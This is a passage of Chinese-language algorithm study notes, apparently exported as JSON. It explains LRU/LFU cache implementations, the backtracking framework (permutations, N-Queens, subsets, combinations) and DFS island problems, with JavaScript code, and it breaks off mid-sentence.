[146. LRU Cache](https://leetcode.com/problems/lru-cache/) | [146. LRU 缓存](https://leetcode.cn/problems/lru-cache/) | 🟠  |\n\n```javascript hl:45,46\n/**\n * LRU (最近最少使用) 缓存实现\n * @param {number} capacity 缓存容量\n */\nvar LRUCache = function (capacity) {\n  // 缓存容量\n  this.cap = capacity;\n  // 使用 Map 来存储缓存数据,保持插入顺序\n  this.cache = new Map();\n};\n\n/**\n * 获取缓存中的值\n * @param {number} key\n * @return {number} 存在返回值,不存在返回 -1\n */\nLRUCache.prototype.get = function (key) {\n  // 如果 key 不存在,返回 -1\n  if (!this.cache.has(key)) {\n    return -1;\n  }\n  // 将访问的 key 设为最近使用\n  this.makeRecently(key);\n  return this.cache.get(key);\n};\n\n/**\n * 向缓存中添加或更新值\n * @param {number} key\n * @param {number} val\n */\nLRUCache.prototype.put = function (key, val) {\n  // 如果 key 已存在\n  if (this.cache.has(key)) {\n    // 更新值\n    this.cache.set(key, val);\n    // 将 key 设为最近使用\n    this.makeRecently(key);\n    return;\n  }\n\n  // 如果缓存已满\n  if (this.cache.size >= this.cap) {\n    // 删除最久未使用的元素(Map 中的第一个元素)\n    // const oldestKey = [...this.cache.keys()][0]; // 超出限制\n    const oldestKey = this.cache.keys().next().value;\n    this.cache.delete(oldestKey);\n  }\n  // 添加新元素到 Map 末尾\n  this.cache.set(key, val);\n};\n\n/**\n * 将某个 key 标记为最近使用\n * @param {number} key\n */\nLRUCache.prototype.makeRecently = function (key) {\n  // 获取当前值\n  const val = this.cache.get(key);\n  // 删除当前 key\n  this.cache.delete(key);\n  // 重新插入到 Map 末尾,这样就变成最近使用的了\n  this.cache.set(key, val);\n};\n```\n\n\n## 目录\n<!-- toc -->\n ## 为不用双链表？使用 Map 即可 \n\n\n>  Map 是有序的集合，会按照插入顺序保持键值对的顺序\n\n```javascript\nconst map = new Map();\nmap.set('c', 3);\nmap.set('a', 1);\nmap.set('b', 2);\n\nconsole.log(map.values().next().value); // 3\nconsole.log(map.keys().next().value); // a\nconsole.log(map.entries().next().value[0]); // a\n```\n\n\n\n","nmEEcx2O":"\n# LFU 缓存\n\n\n- LRU 算法的淘汰策略是 Least Recently Used，也就是每次淘汰那些最久没被使用的数据；\n- 而 LFU 算法的淘汰策略是 Least Frequently Used，也就是**每次淘汰那些使用次数最少**的数据。\n\n\n|LeetCode|力扣|难度|\n|---|---|---|\n|[460. LFU Cache](https://leetcode.com/problems/lfu-cache/)|[460. LFU 缓存](https://leetcode.cn/problems/lfu-cache/)|🔴|\n\n\n直接上代码了\n\n```javascript\nclass LFUCache {\n    // key 到 val 的映射，我们后文称为 KV 表\n    constructor(capacity) {\n        this.keyToVal = new Map();\n        // key 到 freq 的映射，我们后文称为 KF 表\n        this.keyToFreq = new Map();\n        // freq 到 key 列表的映射，我们后文称为 FK 表\n        this.freqToKeys = new Map();\n        // 记录最小的频次\n        this.minFreq = 0;\n        // 记录 LFU 缓存的最大容量\n        this.cap = capacity;\n    }\n\n    get(key) {\n        if (!this.keyToVal.has(key)) {\n            return -1;\n        }\n        // 增加 key 对应的 freq\n        this.increaseFreq(key);\n        return this.keyToVal.get(key);\n    }\n\n    put(key, val) {\n        if (this.cap <= 0) return;\n\n        // 若 key 已存在，修改对应的 val 即可\n        if (this.keyToVal.has(key)) {\n            this.keyToVal.set(key, val);\n            // key 对应的 freq 加一\n            this.increaseFreq(key);\n            return;\n        }\n\n        // key 不存在，需要插入\n        // 容量已满的话需要淘汰一个 freq 最小的 key\n        if (this.cap <= this.keyToVal.size) {\n            this.removeMinFreqKey();\n        }\n\n        // 插入 key 和 val，对应的 freq 为 1\n        // 插入 KV 表\n        this.keyToVal.set(key, val);\n        // 插入 KF 表\n        this.keyToFreq.set(key, 1);\n        // 插入 FK 表\n        if (!this.freqToKeys.has(1)) {\n            this.freqToKeys.set(1, new Set());\n        }\n        this.freqToKeys.get(1).add(key);\n        // 插入新 key 后最小的 freq 肯定是 1\n        this.minFreq = 1;\n    }\n\n    removeMinFreqKey() {\n        // freq 最小的 key 列表\n        const keyList = this.freqToKeys.get(this.minFreq);\n        // 其中最先被插入的那个 key 就是该被淘汰的 key\n        const deletedKey = keyList.values().next().value;\n        // 更新 FK 表\n        keyList.delete(deletedKey);\n        if (keyList.size === 0) {\n            this.freqToKeys.delete(this.minFreq);\n            // 问：这里需要更新 minFreq 的值吗？\n        }\n        // 更新 KV 表\n        this.keyToVal.delete(deletedKey);\n        // 更新 KF 表\n        this.keyToFreq.delete(deletedKey);\n    }\n\n    increaseFreq(key) {\n        const freq = this.keyToFreq.get(key);\n        // 更新 KF 表\n        this.keyToFreq.set(key, freq + 1);\n        // 更新 FK 表\n        // 将 key 从 freq 对应的列表中删除\n        this.freqToKeys.get(freq).delete(key);\n        // 将 key 加入 freq + 1 对应的列表中\n        if (!this.freqToKeys.has(freq + 1)) {\n            this.freqToKeys.set(freq + 1, new Set());\n        }\n        this.freqToKeys.get(freq + 1).add(key);\n        // 如果 freq 对应的列表空了，移除这个 freq\n        if (this.freqToKeys.get(freq).size === 0) {\n            this.freqToKeys.delete(freq);\n            // 如果这个 freq 恰好是 minFreq，更新 minFreq\n            if (freq === this.minFreq) {\n                this.minFreq++;\n            }\n        }\n    }\n}\n```\n","aCEe3zgs":"\n# 前言\n\n\n> 回溯算法与 DFS 算法\n\n","lrsfLcyU":"\n# 回溯算法与DFS算法的区别？\n\n\n\n## 目录\n<!-- toc -->\n ## 1. 树枝与节点的区别 \n\n其实`回溯算法`和我们常说的 `DFS 算法`非常类似，本质上就是一种**暴力穷举算法**。`回溯算法` 和 `DFS` 算法的细微差别是：\n- `回溯算法`是在`遍历「树枝」` ，在于`路径`\n- `DFS 算法`是在`遍历「节点」`\n\n![图片&文件](./files/20241113.png)\n\n## 2. 算法框架区别\n\n- 做选择和撤销选择是否在 for 循环里面\n\n```javascript hl:1,15\n// 回溯算法框架模板\nfunction backtrack(...) {\n    if (到达叶子节点) {\n        return;\n    }\n    for (int i = 0; i < n; i++;) {\n        // 做选择\n        ...\n        backtrack(...)\n        // 撤销选择\n        ...\n    }\n}\n\n// DFS 算法框架模板\nfunction dfs(...) {\n    if (到达叶子节点) {\n        return;\n    }\n    // 做选择\n    ...\n    for (int i = 0; i < n; i++) {\n        dfs(...)\n    }\n    // 撤销选择\n    ...\n}\n\n```\n\n## 3. backtrack、dfs、traverse 不要有返回值\n\n- 对于 `backtrack/dfs/traverse` 函数，就作为单纯的遍历函数，请不要给它们带返回值\n\t- 因为这是`遍历的思路`，而`分解问题的思路`，则一定会有返回值\n- 如果需要其他变量，请使用**外部变量**\n\n## 4. base case 写在哪儿？\n\n> 这么写，好理解些\n\n```javascript hl:2,14\nvoid traverse(TreeNode root) {\n    // base case\n    if (root == null) {\n        return;\n    }\n    // 前序位置\n    traverse(root.left);\n    // 中序位置\n    traverse(root.right);\n    // 后序位置\n}\n\nvoid backtrack(...) {\n    // base case\n    if (到达叶子节点) {\n        return;\n    }\n\n    for (int i = 0, i < n; i++) {\n        // 剪枝逻辑\n        if (第 i 个选择不满足条件) {\n            continue;\n        }\n\n        // 做选择\n        ...\n\n        backtrack(...)\n\n        // 撤销选择\n        ...\n    }\n}\n\n```\n\n## 5. 剪枝逻辑写在哪儿？\n\n> 这么写，好理解些\n\n```javascript hl:8\nvoid backtrack(...) {\n    // base case\n    if (到达叶子节点) {\n        return;\n    }\n\n    for (int i = 0, i < n; i++) {\n        // 剪枝逻辑\n        if (第 i 个选择不满足条件) {\n            continue;\n        }\n\n        // 做选择\n        ...\n\n        backtrack(...)\n\n        // 撤销选择\n        ...\n    }\n}\n```\n\n","wMnIU4M9":"\n# 回溯算法解题框架\n\n\n`#2023/05/18`  `#算法/回溯`  `#算法/DFS`\n\n\n## 目录\n<!-- toc -->\n ## 1. 回溯算法框架 \n\n站在**回溯树**的一个节点上，你只需要思考 3 点\n- 路径：也就是已经做出的选择。\n- 选择列表：也就是你当前可以做的选择。\n- 结束条件：也就是到达决策树底层，无法再做选择的条件。\n\n```javascript\nconst result = [];\n\nfunction backtrack('路径', '选择列表') {\n    if ('满足结束条件') {\n        result.add('路径');\n        return;\n    }\n    for (let '选择' of '选择列表') {\n        // 做选择;\n        backtrack('路径', '选择列表');\n        // 撤销选择;\n    }\n}\n```\n\n其核心就是 `for 循环里面的递归`\n- 在`递归`调用之`前` `「做选择」`\n- 在`递归`调用之`后`  `「撤销选择」`\n\n关于这个框架的原理解释？ 见下面`全排列`的分析，你就明白了\n\n## 2. 全排列\n\n> [https://leetcode.cn/problems/permutations/](https://leetcode.cn/problems/permutations/)\n\n![|600](https://832-1310531898.cos.ap-beijing.myqcloud.com/36a9a199ce4568829f9d53d3803740f6.png)\n\n其实，就是一个排列组合的数学题，我们也知道 `n` 个不重复的数，全排列共有 `n!` 个 ，比方说给三个数 `[1,2,3]` ，我们来画一画这颗`决策树` ，如下：\n\n![|672](https://832-1310531898.cos.ap-beijing.myqcloud.com/963fbd4e9e78cccbc6de0f776253f338.png)\n\n- ① 中的 `[2]` 代表 `路径` ，记录你`已经做过的选择`\n- ② 中的 `[1,3]`代表 `选择列表` ， 表示你当前可以做出的选择\n- ③ 中的，代表你站在 这个`红色的节点`上，做决策，有两层意思\n\t- 已经做了：你已经选择 2\n\t- 准备做：然后再决定选择谁？\n- ④ 代表变 `「结束条件」`就是遍历到树的`底层叶子节点`，这里也就是`选择列表为空`的时候。\n\n![|1376](https://832-1310531898.cos.ap-beijing.myqcloud.com/d9fe71a7f197df686b6b165d40bf26d9.png)\n\n### 2.1. 解法一：使用 ` Array.includes` 来判断是否选中过了\n\n```javascript hl:17,14,5\nvar permute = function (nums) {\n    const len = nums.length;\n    const res = []; // 结果集\n    /**\n     * @param {Array} track 已经选择的列表\n     * */\n    function backtrack(track) {\n        // 递归终止条件\n        if (track.length === len) {\n            return res.push(track)\n        }\n        for (let i = 0; i < len; i++) {\n            // 已经选择过的数字不能再做选择\n            if (!track.includes(nums[i])) {\n                // 做选择\n                track.push(nums[i]);\n                backtrack([...track]); // 一定要 [...track] 否则会报错\n                // 撤销选择\n                track.pop()\n            }\n        }\n    }\n    backtrack([])\n    return res\n};\n\nconsole.log(permute([1, 2, 3]));\nconsole.log(permute([1, 2, 3, 4]));\n```\n\n### 2.2. 解法二：使用 `used` 标识选择过的节点\n\n```javascript hl:4,17,23,15\nvar permute = function (nums) {\n    const len = nums.length;\n    const res = []; // 结果集\n    const used = new Array(nums.length).fill(false); \n    /**\n     * @param {Array} track 已经选择的列表\n     * */\n    function backtrack(track) {\n        // 递归终止条件\n        if (track.length === len) {\n            return res.push(track)\n        }\n        for (let i = 0; i < len; i++) {\n            // 已经选择过的数字不能再做选择\n            if(used[i]) continue;\n            \n            // 做选择\n            track.push(nums[i]);\n            used[i] = true;\n            \n            backtrack([...track]);\n            \n            // 撤销选择\n            track.pop();\n            used[i] = false;\n        }\n    }\n    backtrack([]);\n    return res\n};\n\nconsole.log(permute([1, 2, 3]));\nconsole.log(permute([1, 2, 3, 4]));\n\n```\n\n### 2.3. 变体：输出`元素个数`为 `k` 的所有排列？\n\n只需要，修改下面的 **base case** 即可，代码如下：\n\n```javascript hl:7\nvar permute = function (nums,k) { // 注意这里传入了参数 k\n    const len = nums.length;\n    const res = []; // 结果集\n    const options = []; // 选择列表\n    function backtrack(options) {\n        // ::::base case 选择完了\n        if (options.length === k) {\n            res.push(options)\n            return;\n        }\n        for (let i = 0; i < len; i++) {\n            // 已经选择过的数字不能再做选择\n            if (!options.includes(nums[i])) {\n                // 做选择\n                options.push(nums[i]);\n                backtrack([...options]);\n                // 撤销选择\n                options.pop()\n            }\n        }\n    }\n    backtrack(options)\n    return res\n};\n\nconsole.log(permute([1, 2, 3], 3));\nconsole.log(permute([1, 2, 3], 2));\n\n```\n\n## 3. SKU 排列\n\n```javascript hl:20\nlet names = [\"iPhone X\", \"iPhone XS\"]\nlet colors = [\"黑色\", \"白色\"]\nlet storages = [\"64g\", \"256g\"]\nlet skus = {names,colors,storages};\n\n// [\n//     [\"iPhone X\", \"黑色\", \"64g\"],\n//     [\"iPhone X\", \"黑色\", \"256g\"],\n//     [\"iPhone X\", \"白色\", \"64g\"],\n//     [\"iPhone X\", \"白色\", \"256g\"],\n//     [\"iPhone XS\", \"黑色\", \"64g\"],\n//     [\"iPhone XS\", \"黑色\", \"256g\"],\n//     [\"iPhone XS\", \"白色\", \"64g\"],\n//     [\"iPhone XS\", \"白色\", \"256g\"],\n// ]\n\nlet combine = function (...skus) {\n    let res = [];\n    const backtrack = (opts, selectedArr, index) => {\n        // 取下一个 sku\n        let options = opts[index];\n        if (selectedArr.length === 3) {\n            res.push([...selectedArr]);\n            return;\n        }\n\n\t\t// 根据当前 sku 的可选项进行遍历\n        for (let i = 0; i < options.length; i++) {\n            // 选择\n            selectedArr.push(options[i]);\n            \n            // ::::关键，选择下一个产品类型，即下一个数组\n            \n            backtrack(skus, selectedArr, index + 1);\n            \n            // 取消选择\n            selectedArr.pop();\n        }\n    }\n    backtrack(skus, [], 0)\n    return res\n}\n\nconsole.log(combine(names, colors, storages));\n\n```\n\n> **关键点**，递归函数 `backtrack` 的入参上，即 `opts, selectedArr, index` 这三个参数上。\n\n## 4. N 皇后\n\n> [https://leetcode.cn/problems/n-queens/](https://leetcode.cn/problems/n-queens/)\n\n比如， `N = 4`，那么你就要在 `4x4` 的棋盘上放置 `4 个皇后`，返回以下结果（用 `.` 代表空`棋盘`，`Q` 代表`皇后`），如下图：\n\n![|584](https://832-1310531898.cos.ap-beijing.myqcloud.com/e7bebf8d2009d6d55a08ae6b0f3017ba.png)\n\n皇后可以攻击`同一行`、`同一列`、`左上左下` `右上右下`  四个方向的任意单位。\n\n### 4.1. 附：`初始化`一个 `m*n` 的`二维数组`  最简便的方式\n\n![|664](https://832-1310531898.cos.ap-beijing.myqcloud.com/2b7dcf309d5613314eb9e25201c05ef4.png)\n\n```javascript\n/**\n * 如何初始化一个二维数组\n * */\nfunction initArr(m, n) {\n    // :::: 从可迭代或类数组对象创建一个新的浅拷贝的数组实例\n    return Array.from({length: m}, (item,index) => Array(n).fill('.'));\n}\n\nconsole.log(initArr(3, 4));\nconsole.log(initArr(4, 4));\nconsole.log(initArr(4, 3));\n```\n\n### 4.2. 代码实现\n\n```javascript\n/**\n * https://leetcode.cn/problems/n-queens/\n * */\nlet solveNQueens = function (n) {\n    let res = [];\n    let board = Array.from({length: n}, () => Array(n).fill('.'));\n    /**\n     * @param board 棋盘二维数组\n     * @param row 当前第几行\n     * */\n    let backtrack = function (board, row) {\n        // :::: 满足结束条件, 即已经放置了 n 个皇后\n        if (row === board.length) {\n            // 看题设，需要输出这样的格式\n            const item = board.map((row) => row.join(''));\n            res.push(item);\n            return;\n        }\n        // :::: 从选择列表中选择,这里的选择列表是【二维数组的第 row 行】\n        // 换句话来说，从 第row行  中去选择 某一列\n        let currentRow = board[row].length;\n        for (let col = 0; col < currentRow; col++) {\n            if (!isValid(board, row, col)) {\n                continue;\n            }\n            // :::: 做选择\n            board[row][col] = 'Q';\n            backtrack(board, row + 1);\n            // :::: 撤销选择\n            board[row][col] = '.';\n        }\n    }; \n    let isValid = function (board, row, col) {\n        let totalRow = board.length;\n        // 检查 【当前列】 是否有皇后互相冲突\n        // 所以 列数col不变，行数变化\n        for (let i = 0; i < row; i++) {\n            if (board[i][col] === 'Q') {\n                return false;\n            }\n        }\n        // 检查【右上方】是否有皇后互相冲突\n        for (let i = row - 1, j = col + 1; i >= 0 && j < totalRow; i--, j++) {\n            if (board[i][j] === 'Q') {\n                return false;\n            }\n        }\n        // 检查【左上方】 是否有皇后互相冲突\n        for (let i = row - 1, j = col - 1; i >= 0 && j >= 0; i--, j--) {\n            if (board[i][j] === 'Q') {\n                return false;\n            }\n        }\n        return true;\n    };\n    backtrack(board, 0);\n    return res;\n};\n\n\n```\n\n关于，`isValid` 的逻辑，分析可见 `fj` \n\n[https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=161-198&t=Cw0r27yobQ8yinDi-4](https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=161-198&t=Cw0r27yobQ8yinDi-4)\n\n![|984](https://832-1310531898.cos.ap-beijing.myqcloud.com/f6c1b65af55a9c2696bbd59b30dc6ff2.png)\n\n回溯算法中，如果**只需要一个结果即可**，如上题中，只需要一个符合规范的 N 皇后布局，外部变量标识是否找到，找到直接 `return` 即可，如下代码：\n\n```javascript hl:6\n// 函数找到一个答案后就返回 true\nvar found = false;\n\nfunction backtrack(board, row) {\n    // 已经找到一个答案了，不用再找了\n    if (found) {\n        return;\n    }\n    // 触发结束条件\n    if (row === board.length) {\n        res.push(board);\n        // 找到了第一个答案\n        found = true;\n        return;\n    }\n    ...\n}\n```\n\n## 5. N 皇后 II\n\n>[https://leetcode.cn/problems/n-queens-ii/](https://leetcode.cn/problems/n-queens-ii/)\n\n把 上题 改成返回 个数 而已，其他都不需要变，把 `res = 0`  即可，因为 `res=[]` 肯定更占内存。代码如下：\n\n```javascript\n\nlet totalNQueens = function (n) {\n    let res = 0;\n    let board = Array.from({length: n}, () => Array(n).fill('.'));\n    /**\n     * @param board 棋盘二维数组\n     * @param row 当前第几行\n     * */\n    let backtrack = function (board, row) {\n        // :::: 满足结束条件, 即已经放置了 n 个皇后\n        if (row === board.length) {\n            res++;\n            return;\n        }\n        // :::: 从选择列表中选择,这里的选择列表是【二维数组的第 row 行】\n        // 换句话来说，从 第row行  中去选择 某一列\n        let currentRowLen = board[row].length;\n        for (let col = 0; col < currentRowLen; col++) {\n            if (!isValid(board, row, col)) {\n                continue;\n            }\n            // :::: 做选择\n            board[row][col] = 'Q';\n            backtrack(board, row + 1);\n            // :::: 撤销选择\n            board[row][col] = '.';\n        }\n    };\n\n    let isValid = function (board, row, col) {\n        let totalRow = board.length;\n        // 检查 【上方】 是否有皇后互相冲突\n        // 所以 列数col不变，行数变化\n        for (let i = 0; i < row; i++) {\n            if (board[i][col] === 'Q') {\n                return false;\n            }\n        }\n        // 检查【右上方】是否有皇后互相冲突\n        for (let i = row - 1, j = col + 1; i >= 0 && j < totalRow; i--, j++) {\n            if (board[i][j] === 'Q') {\n                return false;\n            }\n        }\n        // 检查【左上方】 是否有皇后互相冲突\n        for (let i = row - 1, j = col - 1; i >= 0 && j >= 0; i--, j--) {\n            if (board[i][j] === 'Q') {\n                return false;\n            }\n        }\n        return true;\n    };\n    backtrack(board, 0);\n    return res;\n};\n\n\n```\n\n### 5.1. 复杂度分析\n\n当 N = 8 时，就是`八皇后问题`，数学大佬`高斯穷尽一生`都没有数清楚八皇后问题到底有几种可能的放置方法，但是我们的算法只需要一秒就可以算出来所有可能的结果。\n==所以，计算机真的很强大==\n\nN 行棋盘中，第一行有 `N` 个位置可能可以放皇后，第二行有 `N - 1` 个位置，第三行有 `N - 2` 个位置，以此类推，再叠加每次放皇后之前 `isValid` 函数所需的 `O(N)` 复杂度，所以总的时间复杂度上界是 `O(N! * N)`  。\n\n","JzGMHTkv":"\n# 回溯算法解决排列、组合、子集问题\n\n\n`#回溯算法` \n\n\n## 目录\n<!-- toc -->\n ## 子集：元素不重复不可复选 \n\n[https://leetcode.cn/problems/subsets/](https://leetcode.cn/problems/subsets/)\n![|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/e5977d58a644022f4079de04183590fb.png)\n\n- 元素互不相同\n- 子集不可重复：\n\t- 我们通过保证元素之间的`相对顺序`不变来防止出现重复的子集\n\n![|624](https://832-1310531898.cos.ap-beijing.myqcloud.com/72a8bcd2508fda6eaa0e6a7ee541627f.png)\n\n代码如下：\n\n```javascript hl:18\n/**\n * @param {number[]} nums\n * @return {number[][]}\n */\nvar subsets = function (nums) {\n    // 用于存储结果\n    const res = [];\n    // 用于记录回溯路径\n    const track = [];\n    /**\n     * 回溯算法的核心函数，用于遍历子集问题的回溯树\n     * @param {number} start - 控制树枝的遍历，避免产生重复子集\n     */\n    const backtrack = (start) => {\n        // 前序遍历位置，每个节点的值都是一个子集\n        res.push([...track]); // 这里需要浅拷贝才行\n        // ::::其实这里可以不用判断，因为for循环的条件已经限制了i的取值范围\n        // ::::这里加上是为了方便理解 【回溯算法的框架】\n        if (start === nums.length) return;\n        // 回溯算法标准框架\n        for (let i = start; i < nums.length; i++) {\n            // 做选择\n            track.push(nums[i]);\n            // 回溯遍历下一层节点\n            backtrack(i + 1);\n            // 撤销选择\n            track.pop();\n        }\n    };\n    backtrack(0);\n    return res;\n};\n\nconsole.log(subsets([1, 2, 3]));\nconsole.log(subsets([1, 2, 3, 4]));\n\n```\n\n##  组合：元素不重复不可复选\n\n> [https://leetcode.cn/problems/combinations/](https://leetcode.cn/problems/combinations/)\n\n\n![|776](https://832-1310531898.cos.ap-beijing.myqcloud.com/71bd4336ce8d521d370e45ea68e5e3ad.png)\n\n给你输入一个数组 `nums = [1,2..,n]` 和一个正整数 `k`，请你生成所有`大小为 k 的子集` ，是不是就是上一题的一种特殊场景而已。所以两种思路：\n\n### 思路 1：\n\n复用子集的代码，最终返回结果 `再过滤长度=k` 的子集不就行了嘛？\n\n### 思路 2：\n\n修改 `base case` ，代码如下：\n\n```javascript\n/**\n * @param {number} n \n * @param {number} k \n * @return {number[][]} \n */\nvar combine = function(n, k) {\n    const res = [];\n    const track = [];\n    // 主函数\n    function backtrack(start, n, k) {\n        // base case\n        if (k === track.length) {\n            // 遍历到了第 k 层，收集当前节点的值\n            res.push([...track]);\n            return;\n        }\n        // 回溯算法标准框架\n        for (let i = start; i <= n; i++) {\n            // 选择\n            track.push(i);\n            // 通过 start 参数控制树枝的遍历，避免产生重复的子集\n            backtrack(i + 1, n, k);\n            // 撤销选择\n            track.pop();\n        }\n    }\n    backtrack(1, n, k);\n    return res;\n};\n```\n\n\n## 子集 II ：元素重复不可复选\n\n> [https://leetcode.cn/problems/subsets-ii/](https://leetcode.cn/problems/subsets-ii/)\n\n![|680](https://832-1310531898.cos.ap-beijing.myqcloud.com/a730e5dae027ee1623d8d8863d6618d4.png)\n\n相较于`子集`主要区别在于：\n- 可能有重复元素\n- 但子集中不能含有重复元素\n\n所以，`先排序`，让相同的元素靠在一起，如果发现 `nums[i] == nums[i-1]`，则跳过，所以简单改下 子集 的代码，即可，如下：\n\n```javascript\nvar subsetsWithDup = function(nums) {\n    // 定义结果数组和回溯时的路径数组\n    let res = [];\n    let track = [];\n    // 排序，以便于剪枝算法的实现\n    nums.sort((a, b) => a - b);\n    // 回溯算法\n    const backtrack = (nums, start) => {\n        // 前序位置，每个节点的值都是一个子集\n        res.push([...track]);\n        // 遍历子集树枝\n        for (let i = start; i < nums.length; i++) {\n            // 剪枝逻辑，值相同的相邻树枝，只遍历第一条\n            if (i > start && nums[i] === nums[i - 1]) {\n                continue;\n            }\n            // 选择当前元素，加入路径数组\n            track.push(nums[i]);\n            // 向子节点递归\n            backtrack(nums, i + 1);\n            // 回溯，撤销选择\n            track.pop();\n        }\n    }\n    backtrack(nums, 0);\n    return res;\n};\n\n```\n\n## 组合总和 II ：元素可重不可复选\n\n![|712](https://832-1310531898.cos.ap-beijing.myqcloud.com/dc788f87448a26142ca7354275ef6bbc.png)\n\n- 即，换种思路理解题解：从一个班中，找到体重和为 `1000kg` 的同学去，划船，因为船最大载重为 `1000 kg`\n\n```javascript\n/**\n * @param {number[]} candidates\n * @param {number} target\n * @return {number[][]}\n */\nvar combinationSum2 = function (candidates, target) {\n    let res = [];\n    let track = [];\n    let trackSum = 0;\n    let sortedCandidates = candidates.sort((a, b) => a - b); // 排序\n    // 回溯函数\n    const backtrack = (nums, start, target) => {\n        // 达到目标和，找到符合条件的组合，记录结果\n        if (trackSum === target) {\n            res.push([...track]);\n            return;\n        }\n        // 先剪枝，超过目标和，直接结束\n        if (trackSum > target) {\n            return;\n        }\n        // 回溯算法标准框架\n        for (let i = start; i < nums.length; i++) {\n            // 剪枝逻辑，值相同的树枝，只遍历第一条\n            if (i > start && nums[i] === nums[i - 1]) {\n                continue;\n            }\n            // 做选择\n            track.push(nums[i]);\n            trackSum += nums[i];\n            // 递归遍历下一层回溯树\n            backtrack(nums, i + 1, target);\n            // 撤销选择\n            track.pop();\n            trackSum -= nums[i];\n        }\n    }\n    backtrack(sortedCandidates, 0, target);\n    return res;\n};\n\n```\n\n> [!question]\n很早很早以前刷过这题，那时候还不知道这叫 **回溯算法**，搞出来了还沾沾自喜？\n\n\n## 全排列 II ：元素可重复不可复选\n\n![|640](https://832-1310531898.cos.ap-beijing.myqcloud.com/43085e68d81e39ff3a9327d52b86c16b.png)\n改题的可选数组可能`有重复`，我们来看看前面提到的 `没有重复元素的场景` \n\n先看能否通过  `includes` 代码如下：\n\n```javascript\nvar permute = function (nums) {\n    const len = nums.length;\n    const res = []; // 结果集\n    const options = []; // 选择列表\n    function backtrack(options) {\n        // 递归终止条件\n        if (options.length === len) {\n            return res.push(options)\n        }\n        for (let i = 0; i < len; i++) {\n            // 已经选择过的数字不能再做选择\n            if (!options.includes(nums[i])) {\n                // 做选择\n                options.push(nums[i]);\n                backtrack([...options]);\n                // 撤销选择\n                options.pop()\n            }\n        }\n    }\n    backtrack(options)\n    return res\n};\n```\n能否通过上面的 `includes` 方法来判断，剪枝呢，答案是很麻烦，因为 `includes` 只是标识数组是否包含某个元素，元素重复时就会比较麻烦，所以还是使用 `used 数组`变量来标识是否被选中了，即参考 实现：代码如下\n\n```javascript\nvar permute = function (nums) {\n    const len = nums.length;\n    const res = []; // 结果集\n    const used = new Array(nums.length).fill(false); // 选择列表\n\n    /**\n     * @param {Array} track 已经选择的列表\n     * */\n    function backtrack(track) {\n        // 递归终止条件\n        if (track.length === len) {\n            return res.push(track)\n        }\n        for (let i = 0; i < len; i++) {\n            // 已经选择过的数字不能再做选择\n            if(used[i]) continue;\n            // 做选择\n            track.push(nums[i]);\n            used[i] = true;\n            backtrack([...track]);\n            // 撤销选择\n            track.pop();\n            used[i] = false;\n        }\n    }\n    backtrack([]);\n    return res\n};\n\nconsole.log(permute([1, 2, 3]));\nconsole.log(permute([1, 2, 3, 4]));\n```\n\n这里需要`剪枝` , 代码如下：\n\n```javascript\n/**\n * @param {number[]} nums\n * @return {number[][]}\n */\nvar permuteUnique = function (nums) {\n    const len = nums.length;\n    const res = []; // 结果集\n    const track = []; // 选择列表\n    const used = new Array(len).fill(false); // 记录元素是否使用过\n    // ::::排序，让相同的元素靠在一起,以便于剪枝算法的实现\n    nums.sort((a, b) => a - b);\n    \n    function backtrack(track) {\n        // 递归终止条件\n        if (track.length === len) {\n            return res.push([...track]);\n        }\n        for (let i = 0; i < len; i++) {\n            // :::: 已经选择过的数字不能再做选择\n            if (used[i]) {\n                continue;\n            }\n            // :::: 两个元素相邻，并且还未选择前一个元素\n            if (i > 0 && nums[i-1] === nums[i] && !used[i-1]) {\n                // 如果前面的相邻相等元素没有用过，则跳过\n                continue;\n            }\n            // 做选择\n            track.push(nums[i]);\n            used[i] = true;\n            backtrack([...track]);\n            // 撤销选择\n            track.pop();\n            used[i] = false;\n        }\n    }\n    // 传入空数组，代表选择列表\n    backtrack(track)\n    return res\n};\n\nconsole.log(permuteUnique([1, 1, 2]));\nconsole.log(permuteUnique([1, 3, 2]));\n\n```\n\n**分析：**\n\n当出现重复元素时，比如输入  `nums = [1,2,2',2'']`，`2'` 只有在 `2` 已经被使用的情况下才会被选择，同理，`2''` 只有在 `2'` 已经被使用的情况下才会被选择，这就 `保证了相同元素在排列中的相对位置保证固定`。\n\n> [!tip]\n另外你会发现，**只要涉及到重复**，就得`对可选列表排序`\n\n\n\n","wUPe8725":"\n# 回溯算法穷举的两种视角（球盒模型）\n\n\n`#回溯算法` \n\n\n> 正常使用回溯算法的框架`backtrack` 就能解决，但还有通过 `swap` 元素实现全排列，这是球盒模型的另一个思路，知道即可，不展开了！\n\n- 回溯算法穷举的本质思维模式是「球盒模型」，一切回溯算法，皆从此出，别无二法。\n- 球盒模型，必然有两种穷举视角，分别为「球」的视角穷举和「盒」的视角穷举，对应的，就是两种不同的代码写法。\n- 从理论上分析，两种穷举视角本质上是一样的。但是涉及到具体的代码实现，两种写法的复杂度可能有优劣之分。你需要选择效率更高的写法。\n\n","WNNs7ysU":"\n# 使用 DFS 解决岛屿问题\n\n`#算法/DFS` \n\n岛屿系列题目的核心考点就是：用 DFS/BFS 算法遍历二维数组，本文都使用 DFS 算法\n\n\n## 目录\n<!-- toc -->\n ## 1. 二维矩阵遍历框架 \n\n二维矩阵就可以抽象成一幅`网状的「图」结构`\n\n```javascript hl:7,12\n// 二维矩阵遍历框架\nvar dfs = function (grid, i, j, visited) {\n  var m = grid.length,\n    n = grid[0].length;\n\n  if (i < 0 || j < 0 || i >= m || j >= n) {\n    // 超出索引边界\n    return;\n  }\n\n  if (visited[i][j]) {\n    // 已遍历过 (i, j)\n    return;\n  }\n\n  // 进入当前节点 (i, j)\n  visited[i][j] = true;\n\n  // 进入相邻节点（四叉树）\n  // 上\n  dfs(grid, i - 1, j, visited);\n  // 下\n  dfs(grid, i + 1, j, visited);\n  // 左\n  dfs(grid, i, j - 1, visited);\n  // 右\n  dfs(grid, i, j + 1, visited);\n};\n\n```\n\n\n## 2. 岛屿数量\n\n>  第 200 题「[岛屿数量](https://leetcode.cn/problems/number-of-islands)」\n\n![图片&文件](./files/20241113-3.png)\n\n如上图，`0` 代表`海水`，`1` 代表`陆地`，返回独立岛屿的数量为 `4`\n\n思路：\n- 使用上面的遍历框架，只要发现一个陆地，就把它周边的陆地都变成海水\n- 这样主要是为了省事，避免维护 `visited` 数组\n\t- 因为 `dfs` 函数遍历到值为 `0` 